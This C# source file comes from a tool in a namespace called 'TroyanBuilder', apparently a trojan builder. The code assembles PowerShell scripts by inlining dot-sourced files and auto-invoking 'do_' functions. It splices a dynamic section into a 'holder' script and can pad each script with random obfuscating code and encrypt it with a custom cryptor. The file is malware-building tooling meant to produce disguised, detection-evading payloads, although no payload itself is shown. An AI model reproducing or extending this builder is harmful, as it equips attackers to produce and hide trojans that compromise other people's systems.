using System.Management.Automation.Language;
using System.Text;

namespace TroyanBuilder;

public partial class CustomBuilder
{
    public class SourceFile
    {
        public string Name { get; set; }
        public string Data { get; set; }
        public bool IsDo { get; set; }
        public bool Loaded { get; set; }

        public string CryptedData()
        {
            return CustomCryptor.Encode(Data);
        }
    }
    
    protected virtual List<SourceFile> GetSourceFiles()
    {
        var files =Directory.GetFiles(SourceDir)
            .Select(Path.GetFileNameWithoutExtension)
            .ToArray().Except(new[] { "program","header","footer","dynamic" })!
            .SortWithPriority(PriorityTasks, UnpriorityTasks)
            .ToList();
        return files.Select(a=> new SourceFile(){Name = a}).ToList();
    }
    
    private Dictionary<string, SourceFile> CachedSourceFiles { get; set; } = new Dictionary<string, SourceFile>();

    private SourceFile ReadSource(string sourceFile)
    {
        if (CachedSourceFiles.ContainsKey(sourceFile))
        {
            return CachedSourceFiles[sourceFile];
        }
        var result = ReadSourceInternal(sourceFile);
   
        if (IsObfuscate)
            result.Data = new PowerShellObfuscator().RandomCode() + result.Data + new PowerShellObfuscator().RandomCode(); 
    
        CachedSourceFiles.Add(sourceFile, result);
        return result;
    }

    private SourceFile ReadSourceInternal(string sourceFile)
    {
        var result = new SourceFile() {Name = sourceFile};
        var path = "";
        var dir = SourceDir;
        while (!File.Exists(path))
        {
            path = Path.Combine(dir, sourceFile + ".ps1");
            dir = Path.Combine(dir,"..");
        }

        var lines = File.ReadAllLines(path).ToList();
        
        var units = new List<SourceFile>();
        
        int index = 0;
        while (index < lines.Count)
        {
            var line = lines[index];
            if (line.StartsWith(". ./"))
            {
                var relativePath = line[2..].Trim();
                var filenameWithoutExt = Path.GetFileNameWithoutExtension(relativePath);
                lines.RemoveAt(index);
                var linked = ReadSource(filenameWithoutExt);
                units.Add(linked);
            }
            else if (line.Trim().StartsWith("do_"))
            {
                lines.RemoveAt(index);
            }
            else
            {
                index++;
            }
        }

        var sb = new StringBuilder();

        foreach (var unit in units)
        {
            if (!IsDebug)
            {
                sb.AppendLine(unit.Data);
                sb.AppendLine("");
            }
        }

        foreach (var line in lines)
        {
            sb.AppendLine(line);
        }

        sb.AppendLine("");

        result.Data = sb.ToString();
        result.IsDo = result.Data.Contains($"function do_{sourceFile}");
        if (!IsDebug && result.IsDo)
        {
            result.Data += Environment.NewLine + $"do_{sourceFile}";
        }
        
        if (result.IsDo)
            result.Data += Environment.NewLine + ReadSource("footer").Data;

        if (sourceFile == "holder")
        {
            result.Data = result.Data.Replace("###dynamic", ReadSource("dynamic").Data);
        }
        
        result.Loaded = true;

        return result;
    }
}